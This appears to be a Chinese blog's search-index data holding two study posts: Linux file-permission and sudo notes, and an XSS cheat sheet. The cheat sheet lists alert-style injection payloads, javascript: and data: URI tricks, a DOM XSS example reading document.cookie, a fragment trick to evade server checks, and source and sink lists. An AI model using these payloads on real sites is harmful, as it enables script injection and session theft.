&#x6765;&#x8868;&#x793A;&#x5728;&#x6709;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5176;&#x6240;&#x6709;&#x8005;&#x62E5;&#x6709;&#x53EF;&#x8BFB;&#x3001;&#x53EF;&#x5199;&#x3001;&#x53EF;&#x6267;&#x884C;&#x7684;&#x6743;&#x9650;&#xFF0C;&#x5176;&#x6587;&#x4EF6;&#x6240;&#x5C5E;&#x7EC4;&#x62E5;&#x6709;&#x53EF;&#x8BFB;&#x3001;&#x53EF;&#x5199;&#x7684;&#x6743;&#x9650;&#xFF1B;&#x800C;&#x4E14;&#x5176;&#x4ED6;&#x4EBA;&#x53EA;&#x6709;&#x53EF;&#x8BFB;&#x7684;&#x6743;&#x9650;&#x3002;&#x90A3;&#x4E48;&#xFF0C;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x5C31;&#x662F; rwxrw-r--&#xFF0C;&#x6570;&#x5B57;&#x6CD5;&#x8868;&#x793A;&#x5373;&#x4E3A; 764&#x3002; &#x6587;&#x4EF6;&#x7684;&#x7279;&#x6B8A;&#x6743;&#x9650;&#x6587;&#x4EF6;&#x6700;&#x5927;&#x7684; 777 &#x6743;&#x9650;&#xFF08;rwxrwxrwx&#xFF09; SUID SUID &#x662F;&#x4E00;&#x79CD;&#x5BF9;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#x7684;&#x7279;&#x6B8A;&#x6743;&#x9650;&#xFF0C;&#x53EF;&#x4EE5;&#x8BA9;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#x8005;&#x4E34;&#x65F6;&#x62E5;&#x6709;&#x5C5E;&#x4E3B;&#x7684;&#x6743;&#x9650;&#xFF08;&#x4EC5;&#x5BF9;&#x62E5;&#x6709;&#x6267;&#x884C;&#x6743;&#x9650;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#x6709;&#x6548;&#xFF09;&#x3002; &#x67E5;&#x770B; passwd &#x547D;&#x4EE4;&#x5C5E;&#x6027;&#x65F6;&#x53D1;&#x73B0;&#x6240;&#x6709;&#x8005;&#x7684;&#x6743;&#x9650;&#x7531; rwx &#x53D8;&#x6210;&#x4E86; rws&#xFF0C;&#x5176;&#x4E2D; x &#x6539;&#x53D8;&#x6210; s &#x5C31;&#x610F;&#x5473;&#x7740;&#x8BE5;&#x6587;&#x4EF6;&#x88AB;&#x8D4B;&#x4E88;&#x4E86; SUID &#x6743;&#x9650;&#x3002; SGID SGID &#x4E3B;&#x8981;&#x5B9E;&#x73B0;&#x5982;&#x4E0B;&#x4E24;&#x79CD;&#x529F;&#x80FD;&#xFF1A; &#x8BA9;&#x6267;&#x884C;&#x8005;&#x4E34;&#x65F6;&#x62E5;&#x6709;&#x5C5E;&#x7EC4;&#x7684;&#x6743;&#x9650;&#xFF08;&#x5BF9;&#x62E5;&#x6709;&#x6267;&#x884C;&#x6743;&#x9650;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#xFF09;&#x5728;&#x67D0;&#x4E2A;&#x76EE;&#x5F55;&#x4E2D;&#x521B;&#x5EFA;&#x7684;&#x6587;&#x4EF6;&#x81EA;&#x52A8;&#x7EE7;&#x627F;&#x8BE5;&#x76EE;&#x5F55;&#x7684;&#x7528;&#x6237;&#x7EC4;&#xFF08;&#x53EA;&#x53EF;&#x4EE5;&#x5BF9;&#x76EE;&#x5F55;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#x3002; SGID &#x7684;&#x7B2C;&#x4E00;&#x79CD;&#x529F;&#x80FD;&#x662F;&#x53C2;&#x8003; SUID &#x800C;&#x8BBE;&#x8BA1;&#x7684;&#xFF0C;&#x4E0D;&#x540C;&#x70B9;&#x5728;&#x4E8E;&#x6267;&#x884C;&#x7A0B;&#x5E8F;&#x7684;&#x7528;&#x6237;&#x83B7;&#x53D6;&#x7684;&#x4E0D;&#x518D;&#x662F;&#x6587;&#x4EF6;&#x6240;&#x6709;&#x8005;&#x7684;&#x4E34;&#x65F6;&#x6743;&#x9650;&#xFF0C;&#x800C;&#x662F;&#x83B7;&#x53D6;&#x5230;&#x6587;&#x4EF6;&#x6240;&#x5C5E;&#x7EC4;&#x7684;&#x6743;&#x9650;&#x3002; chmod : &#x8BBE;&#x7F6E;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x7684;&#x6743;&#x9650; chmod[&#x53C2;&#x6570;] &#x6743;&#x9650; &#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x540D;&#x79F0; chmod -Rf 777 testdir/ chown : &#x4EE5;&#x8BBE;&#x7F6E;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x7684;&#x6240;&#x6709;&#x8005;&#x548C;&#x6240;&#x5C5E;&#x7EC4; chown [&#x53C2;&#x6570;] &#x6240;&#x6709;&#x8005;:&#x6240;&#x5C5E;&#x7EC4; &#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x540D;&#x79F0;&#x3002; chown root:bin test &#x5F55;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#x65F6;&#x9700;&#x8981;&#x52A0;&#x4E0A;&#x5927;&#x5199;&#x53C2;&#x6570;-R &#x6765;&#x8868;&#x793A;&#x9012;&#x5F52;&#x64CD;&#x4F5C;&#xFF0C;&#x5373;&#x5BF9;&#x76EE;&#x5F55;&#x5185;&#x6240;&#x6709;&#x7684;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x6574;&#x4F53;&#x64CD;&#x4F5C;&#x3002; SBIT SBIT &#x7279;&#x6B8A;&#x6743;&#x9650;&#x4F4D;&#x53EF;&#x786E;&#x4FDD;&#x7528;&#x6237;&#x53EA;&#x80FD;&#x5220;&#x9664;&#x81EA;&#x5DF1;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x5220;&#x9664;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x7684;&#x6587;&#x4EF6;&#x3002; &#x5F53;&#x76EE;&#x5F55;&#x88AB;&#x8BBE;&#x7F6E; SBIT &#x7279;&#x6B8A;&#x6743;&#x9650;&#x4F4D;&#x540E;&#xFF0C;&#x6587;&#x4EF6;&#x7684;&#x5176;&#x4ED6;&#x4EBA;&#x6743;&#x9650;&#x90E8;&#x5206;&#x7684; x &#x6267;&#x884C;&#x6743;&#x9650;&#x5C31;&#x4F1A;&#x88AB;&#x66FF;&#x6362;&#x6210; t &#x6216;&#x8005; T&#xFF0C;&#x539F;&#x672C;&#x6709; x &#x6267;&#x884C;&#x6743;&#x9650;&#x5219;&#x4F1A;&#x5199;&#x6210; t&#xFF0C;&#x539F;&#x672C;&#x6CA1;&#x6709; x &#x6267;&#x884C;&#x6743;&#x9650;&#x5219;&#x4F1A;&#x88AB;&#x5199;&#x6210; T&#x3002; chmod -R o+t linux/ &#x6587;&#x4EF6;&#x7684;&#x9690;&#x85CF;&#x5C5E;&#x6027; chattr chattr &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x8BBE;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x9690;&#x85CF;&#x6743;&#x9650;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;chattr [&#x53C2;&#x6570;] &#x6587;&#x4EF6;&#x201D;&#x3002; chattr &#x547D;&#x4EE4;&#x4E2D;&#x7528;&#x4E8E;&#x9690;&#x85CF;&#x6743;&#x9650;&#x7684;&#x53C2;&#x6570;&#x53CA;&#x5176;&#x4F5C;&#x7528;&#xFF1A; 123456789101112i &#x65E0;&#x6CD5;&#x5BF9;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#xFF1B;&#x82E5;&#x5BF9;&#x76EE;&#x5F55;&#x8BBE;&#x7F6E;&#x4E86;&#x8BE5;&#x53C2;&#x6570;&#xFF0C;&#x5219;&#x4EC5;&#x80FD;&#x4FEE;&#x6539;&#x5176;&#x4E2D;&#x7684;&#x5B50;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x800C;&#x4E0D;&#x80FD;&#x65B0;&#x5EFA;&#x6216;&#x5220;&#x9664;&#x6587;&#x4EF6;a &#x4EC5;&#x5141;&#x8BB8;&#x8865;&#x5145;&#xFF08;&#x8FFD;&#x52A0;&#xFF09;&#x5185;&#x5BB9;&#xFF0C;&#x65E0;&#x6CD5;&#x8986;&#x76D6;/&#x5220;&#x9664;&#x5185;&#x5BB9;&#xFF08;Append Only&#xFF09;S &#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5728;&#x53D8;&#x66F4;&#x540E;&#x7ACB;&#x5373;&#x540C;&#x6B65;&#x5230;&#x786C;&#x76D8;&#xFF08;sync&#xFF09;s &#x5F7B;&#x5E95;&#x4ECE;&#x786C;&#x76D8;&#x4E2D;&#x5220;&#x9664;&#xFF0C;&#x4E0D;&#x53EF;&#x6062;&#x590D;&#xFF08;&#x7528; 0 &#x586B;&#x5145;&#x539F;&#x6587;&#x4EF6;&#x6240;&#x5728;&#x786C;&#x76D8;&#x533A;&#x57DF;&#xFF09;A &#x4E0D;&#x518D;&#x4FEE;&#x6539;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x7684;&#x6700;&#x540E;&#x8BBF;&#x95EE;&#x65F6;&#x95F4;&#xFF08;atime&#xFF09;b &#x4E0D;&#x518D;&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x7684;&#x5B58;&#x53D6;&#x65F6;&#x95F4;D &#x68C0;&#x67E5;&#x538B;&#x7F29;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x9519;&#x8BEF;d &#x4F7F;&#x7528; dump &#x547D;&#x4EE4;&#x5907;&#x4EFD;&#x65F6;&#x5FFD;&#x7565;&#x672C;&#x6587;&#x4EF6;/&#x76EE;&#x5F55;c &#x9ED8;&#x8BA4;&#x5C06;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x8FDB;&#x884C;&#x538B;&#x7F29;u &#x5F53;&#x5220;&#x9664;&#x8BE5;&#x6587;&#x4EF6;&#x540E;&#x4F9D;&#x7136;&#x4FDD;&#x7559;&#x5176;&#x5728;&#x786C;&#x76D8;&#x4E2D;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x65B9;&#x4FBF;&#x65E5;&#x540E;&#x6062;&#x590D;t &#x8BA9;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x652F;&#x6301;&#x5C3E;&#x90E8;&#x5408;&#x5E76;&#xFF08;tail-merging&#xFF09;X &#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x538B;&#x7F29;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x5185;&#x5BB9; lsattr &#x547D;&#x4EE4; lsattr &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x663E;&#x793A;&#x6587;&#x4EF6;&#x7684;&#x9690;&#x85CF;&#x6743;&#x9650;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;lsattr [&#x53C2;&#x6570;] &#x6587;&#x4EF6;&#x201D;&#x3002; 12ls -al Linuxprobe #&#x4E0D;&#x80FD;&#x770B;&#x5230;&#x9690;&#x85CF;&#x7684;&#x6743;&#x9650;lsattr linuxprobe #&#x80FD;&#x770B;&#x61C2;&#x9690;&#x85CF;&#x7684;&#x6743;&#x9650; &#x6587;&#x4EF6;&#x8BBF;&#x95EE;&#x63A7;&#x5236;&#x5217;&#x8868;&#xFF1A; setfacl &#x547D;&#x4EE4; setfacl &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x7BA1;&#x7406;&#x6587;&#x4EF6;&#x7684; ACL &#x89C4;&#x5219;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;setfacl [&#x53C2;&#x6570;] &#x6587;&#x4EF6;&#x540D;&#x79F0;&#x201D;&#x3002; &#x5176;&#x4E2D;&#xFF0C;&#x9488;&#x5BF9;&#x76EE;&#x5F55;&#x6587;&#x4EF6;&#x9700;&#x8981;&#x4F7F;&#x7528;-R &#x9012;&#x5F52;&#x53C2;&#x6570;&#xFF1B;&#x9488;&#x5BF9;&#x666E;&#x901A;&#x6587;&#x4EF6;&#x5219;&#x4F7F;&#x7528;-m &#x53C2;&#x6570;&#xFF1B;&#x5982;&#x679C;&#x60F3;&#x8981;&#x5220;&#x9664;&#x67D0;&#x4E2A;&#x6587;&#x4EF6;&#x7684; ACL&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;-b &#x53C2;&#x6570;&#x3002; &#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x70B9;&#xFF08;.&#xFF09;&#x53D8;&#x6210;&#x4E86;&#x52A0;&#x53F7;&#xFF08;+&#xFF09;,&#x8FD9;&#x5C31;&#x610F;&#x5473;&#x7740;&#x8BE5;&#x6587;&#x4EF6;&#x5DF2;&#x7ECF;&#x8BBE;&#x7F6E;&#x4E86; ACL &#x4E86;&#x3002; getfacl &#x547D;&#x4EE4; getfacl &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x663E;&#x793A;&#x6587;&#x4EF6;&#x4E0A;&#x8BBE;&#x7F6E;&#x7684; ACL &#x4FE1;&#x606F;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;getfacl &#x6587;&#x4EF6;&#x540D;&#x79F0;&#x201D;&#x3002; getfacl /root su&#x547D;&#x4EE4;&#x4E0E;sudo&#x547D;&#x4EE4;&#x4ECE;&#x7BA1;&#x7406;&#x5458;&#x5207;&#x6362;&#x5230;&#x666E;&#x901A;&#x7528;&#x6237;&#xFF1A; su - linuxprobe su &#x547D;&#x4EE4;&#x4E0E;&#x7528;&#x6237;&#x540D;&#x4E4B;&#x95F4;&#x6709;&#x4E00;&#x4E2A;&#x51CF;&#x53F7;&#xFF08;-&#xFF09;&#xFF0C;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x5B8C;&#x5168;&#x5207;&#x6362;&#x5230;&#x65B0;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x5373;&#x628A;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x4FE1;&#x606F;&#x4E5F;&#x53D8;&#x66F4;&#x4E3A;&#x65B0;&#x7528;&#x6237;&#x7684;&#x76F8;&#x5E94;&#x4FE1;&#x606F;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x4FDD;&#x7559;&#x539F;&#x59CB;&#x7684;&#x4FE1;&#x606F;&#x3002;&#x5F3A;&#x70C8;&#x5EFA;&#x8BAE;&#x5728;&#x5207;&#x6362;&#x7528;&#x6237;&#x8EAB;&#x4EFD;&#x65F6;&#x6DFB;&#x52A0;&#x8FD9;&#x4E2A;&#x51CF;&#x53F7;&#xFF08;-&#xFF09;&#x3002; &#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; exit &#x6765;&#x8FD4;&#x56DE;root&#x6743;&#x9650; sudo &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x7ED9;&#x666E;&#x901A;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x989D;&#x5916;&#x7684;&#x6743;&#x9650;&#x6765;&#x5B8C;&#x6210;&#x539F;&#x672C; root &#x7BA1;&#x7406;&#x5458;&#x624D;&#x80FD;&#x5B8C;&#x6210;&#x7684;&#x4EFB;&#x52A1;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;sudo [&#x53C2;&#x6570;] &#x547D;&#x4EE4;&#x540D;&#x79F0;&#x201D;&#x3002; 12345678910111213141516171819202122232425262728293031323334-h &#x5217;&#x51FA;&#x5E2E;&#x52A9;&#x4FE1;&#x606F;-l &#x5217;&#x51FA;&#x5F53;&#x524D;&#x7528;&#x6237;&#x53EF;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;-u &#x7528;&#x6237;&#x540D;&#x6216; UID &#x503C; &#x4EE5;&#x6307;&#x5B9A;&#x7684;&#x7528;&#x6237;&#x8EAB;&#x4EFD;&#x6267;&#x884C;&#x547D;&#x4EE4;-k &#x6E05;&#x7A7A;&#x5BC6;&#x7801;&#x7684;&#x6709;&#x6548;&#x65F6;&#x95F4;&#xFF0C;&#x4E0B;&#x6B21;&#x6267;&#x884C; sudo &#x65F6;&#x9700;&#x8981;&#x518D;&#x6B21;&#x8FDB;&#x884C;&#x5BC6;&#x7801;&#x9A8C;&#x8BC1;-b &#x5728;&#x540E;&#x53F0;&#x6267;&#x884C;&#x6307;&#x5B9A;&#x7684;&#x547D;&#x4EE4;-p &#x66F4;&#x6539;&#x8BE2;&#x95EE;&#x5BC6;&#x7801;&#x7684;&#x63D0;&#x793A;&#x8BED;&#x9650;&#x5236;&#x7528;&#x6237;&#x6267;&#x884C;&#x6307;&#x5B9A;&#x7684;&#x547D;&#x4EE4;&#xFF1A;&#x8BB0;&#x5F55;&#x7528;&#x6237;&#x6267;&#x884C;&#x7684;&#x6BCF;&#x4E00;&#x6761;&#x547D;&#x4EE4;&#xFF1B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF08;/etc/sudoers&#xFF09;&#x63D0;&#x4F9B;&#x96C6;&#x4E2D;&#x7684;&#x7528;&#x6237;&#x7BA1;&#x7406;&#x3001;&#x6743;&#x9650;&#x4E0E;&#x4E3B;&#x673A;&#x7B49;&#x53C2;&#x6570;&#xFF1B;&#x9A8C;&#x8BC1;&#x5BC6;&#x7801;&#x7684;&#x540E; 5 &#x5206;&#x949F;&#x5185;&#xFF08;&#x9ED8;&#x8BA4;&#x503C;&#xFF09;&#x65E0;&#x987B;&#x518D;&#x8BA9;&#x7528;&#x6237;&#x518D;&#x6B21;&#x9A8C;&#x8BC1;&#x5BC6;&#x7801;&#x3002;&#x90E8;&#x5206;&#x6743;&#x9650;&#xFF1A;visudo96 ##97 ## Allow root to run any commands anywhere98 root ALL=(ALL) ALL99 linuxprobe ALL=(ALL) /usr/bin/cat&#x4E0D;&#x7528;&#x8F93;&#x5165;&#x4E00;&#x6B21;&#x5BC6;&#x7801;&#xFF1A;whereis poweroffpoweroff: /usr/sbin/poweroff /usr/share/man/man8/poweroff.8.gzvisudo&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x7701;&#x7565;&#x90E8;&#x5206;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;96 ##97 ## Allow root to run any commands anywhere98 root ALL=(ALL) ALL99 linuxprobe ALL=NOPASSWD: /usr/sbin/poweroff&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x7701;&#x7565;&#x90E8;&#x5206;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;","link":"/2019/01/01/Linux_basis/"},{"title":"XSS O2 XSS备忘录","text":"XSS&#x8F93;&#x51FA;&#x70B9;(&#x7B80;&#x8981;&#x7B14;&#x8BB0;)&#xFF1A;HTML&#x6807;&#x7B7E;&#x4E4B;&#x95F4;&#x4F8B;&#x5982;&#xFF1A; &lt;div&gt;[&#x8F93;&#x51FA;]&lt;/div&gt; &#x76F4;&#x63A5;&#x63D0;&#x4EA4;&#xFF1A;&lt;script&gt;alert(1)&lt;/script&gt; &#x5F53;&#x6807;&#x7B7E;&#x662F;&#x4E0D;&#x80FD;&#x6267;&#x884C;&#x811A;&#x672C;&#x7684;&#x6807;&#x7B7E;&#x65F6;&#xFF0C;&#x5C31;&#x5F97;&#x5148;&#x628A;&#x90A3;&#x4E2A;&#x6807;&#x7B7E;&#x95ED;&#x5408;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x6CE8;&#x5165;XSS&#x8BED;&#x53E5;&#x3002; &#x4F8B;&#x5982;&#xFF1A;&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt; HTML&#x6807;&#x7B7E;&#x4E4B;&#x5185;&#x4F8B;&#x5982;&#xFF1A;&lt;input type=&quot;text&quot; value=&quot;[&#x8F93;&#x51FA;]&quot;/&gt; &#x4E24;&#x79CD;&#x5E38;&#x89C1;&#x7684;&#x60C5;&#x51B5;&#xFF1A; - &#x95ED;&#x5408;&#x5C5E;&#x6027;&#xFF0C;&#x7136;&#x540E;&#x7528;&#x4E8B;&#x4EF6;&#x6765;&#x89E6;&#x53D1;&#x811A;&#x672C;&#xFF1A; `&quot; onmouseover=alert(1) x=&quot;` - &#x95ED;&#x5408;&#x5C5E;&#x6027;&#x540E;&#x95ED;&#x5408;&#x6807;&#x7B7E;&#xFF0C;&#x7136;&#x540E;&#x76F4;&#x63A5;&#x6267;&#x884C;&#x811A;&#x672C;&#xFF1A; `&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;` &#x5E38;&#x89C1;&#x672A;&#x88AB;&#x8FC7;&#x6EE4;&#x4E8B;&#x4EF6;&#xFF0C;&#x66F4;&#x591A;&#x7684;&#x4E8B;&#x4EF6;&#x5728;&#x9644;&#x5F55;&#x90E8;&#x5206;&#xFF1A; 123456ontoggleonauxclickondblclickoncontextmenuonmouseleaveontouchcancel &#x5F53;&#x8F93;&#x51FA;&#x70B9;&#x5728;src/href/action&#x7B49;&#x5C5E;&#x6027;&#x5185;&#x65F6;&#xFF1A; &lt;a href=&quot;[&#x8F93;&#x51FA;]&quot;&gt;click me &lt;/a&gt;,&#x9664;&#x4E86;&#x95ED;&#x5408;&#x5C5E;&#x6027;&#x6216;&#x6807;&#x7B7E;&#x5916;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;javascript&#x4F2A;&#x534F;&#x8BAE;&#xFF1A;javascript:alert(1)// (//&#x662F;&#x7528;&#x4E8E;&#x6CE8;&#x91CA;&#x540E;&#x9762;&#x7684;js&#x8BED;&#x53E5;) &#x6B64;&#x5916;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;data&#x534F;&#x8BAE;&#xFF1A;data:text/html;base64 (data:&#x534F;&#x8BAE;&#x7684;&#x5FC5;&#x987B;&#x4F5C;&#x4E3A;&#x6574;&#x4E2A;&#x5C5E;&#x6027;&#x503C;&#x51FA;&#x73B0;&#xFF0C;IE&#x4E0D;&#x652F;&#x6301;) data&#x534F;&#x8BAE;&#x4F8B;&#x5B50;&#xFF1A;(&#x5C1D;&#x8BD5;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x5F39;&#x4E0D;&#x4E86;) http://example.com/text.php?t=&quot;&gt;&lt;script src=&quot;data:text/html,JTNDc2NyaXB0JTNFYWxlcnQlMjglMjJYc3MlMjIlMjklM0Mvc2NyaXB0JTNFJTNDJTIxLS0= &lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==&gt;test&lt;/a&gt; &#x8FD8;&#x6709;xlink:href&#x534F;&#x8BAE;&#xFF1A;&lt;a xlink:href=&quot;javascript:alert(14)&quot;&gt; &#x5E38;&#x89C1;&#x5229;&#x7528;&#x6807;&#x7B7E;&#xFF1A; aimginputsvgbodyhtmlembedscriptobjectdetailsisindexiframeaudiovideo &#x6807;&#x7B7E;&#x4E8B;&#x4EF6;&#x5408;&#x96C6; Javascript&#x811A;&#x672C;&#x5185;&#x4F8B;&#x5982;&#xFF1A; &lt;script&gt;a=&quot;[&#x8F93;&#x51FA;]&quot;;...&lt;/script&gt; &#x95ED;&#x5408;&#x6807;&#x7B7E;&#xFF1A;&lt;/script&gt;&lt;script&gt;alert(1)// &#x4E5F;&#x53EF;&#x4EE5;&#x5355;&#x72EC;&#x95ED;&#x5408;&#x53C2;&#x6570;&#xFF1A;&quot;;alert(1);// DOM XSS&#x5F53;&#x5B58;&#x5728;&#x53EF;&#x63A7;&#x5236;&#x7684;DOM&#x8F93;&#x51FA;&#x70B9;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x53EF;&#x80FD;&#x5B58;&#x5728;DOM XSS&#x3002; &#x4E00;&#x4E2A;OWASP&#x7684;&#x4F8B;&#x5B50;&#xFF1A; &#x4E00;&#x4E2A;&#x7F51;&#x9875;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;url&#x7684;default&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x9875;&#x9762;&#x7684;&#x8BED;&#x8A00;&#x3002; 123456789101112&#x2026;Select your language:&lt;select&gt;&lt;script&gt;document.write(&quot;&lt;OPTION value=1&gt;&quot;+document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8)+&quot;&lt;/OPTION&gt;&quot;);document.write(&quot;&lt;OPTION value=2&gt;English&lt;/OPTION&gt;&quot;);&lt;/script&gt;&lt;/select&gt;&#x2026; &#x6B63;&#x5E38;&#x7684;url&#x4E3A;&#xFF1A;http://www.some.site/page.html?default=French &#x53EF;&#x89C1;&#x5224;&#x65AD;&#x7684;&#x811A;&#x672C;&#x5E76;&#x6CA1;&#x6709;&#x5BF9;default&#x7684;&#x503C;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;&#x53C2;&#x6570;&#x7684;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x5B8C;&#x5168;&#x88AB;&#x63A7;&#x5236;&#x3002; &#x5F39;&#x7A97;&#xFF1A; http://www.some.site/page.html?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt; cookie: http://www.some.site/page.html?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt; &#x8FD9;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x666E;&#x901A;&#x7684;DOM XSS&#x3002; &#x8FD9;&#x91CC;&#x4ECE;&#x4E00;&#x4E9B;&#x6587;&#x7AE0;&#x91CC;&#x9762;&#x6458;&#x53D6;&#x4E86;&#x4E00;&#x4E9B;&#x6BD4;&#x8F83;&#x5E38;&#x89C1;&#x7684;&#x8F93;&#x5165;&#x70B9;&#x548C;&#x65B9;&#x6CD5;&#xFF1A; &#x4E00;&#x4E9B;&#x6BD4;&#x8F83;&#x5E38;&#x89C1;&#x7684;&#x8F93;&#x5165;&#x70B9;&#xFF1A; 12345678910111213141516document.URLdocument.documentURIdocument.URLUnencoded (IE 5.5 or later Only)document.baseURIlocationlocation.hreflocation.searchlocation.hashlocation.pathnamedocument.cookiedocument.referrerwindow.namehistory.pushState()history.replaceState()localStoragesessionStorage &#x4E00;&#x4E9B;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x6F0F;&#x6D1E;&#x7684;&#x5371;&#x9669;&#x65B9;&#x6CD5;&#xFF1A; 123456789101112131415161718evalFunctionsetTimeoutsetIntervalsetImmediateexecScriptcrypto.generateCRMFRequestScriptElement.srcScriptElement.textScriptElement.textContentScriptElement.innerTextanyTag.onEventNamedocument.writedocument.writelnanyElement.innerHTMLRange.createContextualFragmentwindow.locationdocument.location &#x6D4F;&#x89C8;&#x5668;&#x4E0D;&#x4F1A;&#x8BB2;url&#x4E2D;#&#x53F7;&#x540E;&#x9762;&#x7684;&#x5185;&#x5BB9;&#x53D1;&#x9001;&#x5230;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x5728;&#x53EF;&#x63A7;&#x70B9;&#x524D;&#x52A0;#&#x6765;&#x907F;&#x514D;&#x670D;&#x52A1;&#x5668;&#x68C0;&#x6D4B;&#xFF0C;&#x4E0A;&#x9762;&#x4F8B;&#x5B50;&#x7684;&#x4EE3;&#x7801;&#x5C31;&#x53EF;&#x4EE5;&#x5199;&#x4F5C;&#xFF1A; http://www.some.site/page.html#default=&lt;script&gt;alert(document.cookie)&lt;/script&gt; &#x9644;&#x5F55;HTML&#x65E0;&#x6CD5;&#x6267;&#x884C;&#x811A;&#x672C;&#x7684;&#x6807;&#x7B7E;123456789101112&#x65E0;&#x6CD5;&#x76F4;&#x63A5;&#x6267;&#x884C;&#x811A;&#x672C;:&lt;title&gt;&lt;/title&gt;&lt;textarea&gt;&lt;/textarea&gt;&lt;xmp&gt;&lt;/xmp&gt;&lt;iframe&gt;&lt;/iframe&gt;&lt;noscript&gt;&lt;/noscript&gt; (noscript &#x5143;&#x7D20;&#x7528;&#x6765;&#x5B9A;&#x4E49;&#x5728;&#x811A;&#x672C;&#x672A;&#x88AB;&#x6267;&#x884C;&#x65F6;&#x7684;&#x66FF;&#x4EE3;&#x5185;&#x5BB9;(&#x6587;&#x672C;))&lt;noframes&gt;&lt;/noframes&gt; (noframes &#x5143;&#x7D20;&#x53EF;&#x4E3A;&#x90A3;&#x4E9B;&#x4E0D;&#x652F;&#x6301;&#x6846;&#x67B6;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x663E;&#x793A;&#x6587;&#x672C;&#x3002;noframes &#x5143;&#x7D20;&#x4F4D;&#x4E8E; frameset &#x5143;&#x7D20;&#x5185;&#x90E8;)&lt;plaintext&gt;&lt;/plaintext&gt;&#x65E0;&#x6CD5;&#x5D4C;&#x5957;&#x5176;&#x4ED6;&#x6807;&#x7B7E;:&lt;script&gt;&lt;/script&gt;&lt;style&gt;&lt;/style&gt; &#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x7A0B;&#x5E8F; &#x4E8B;&#x4EF6; &#x63CF;&#x8FF0; FSCommand() 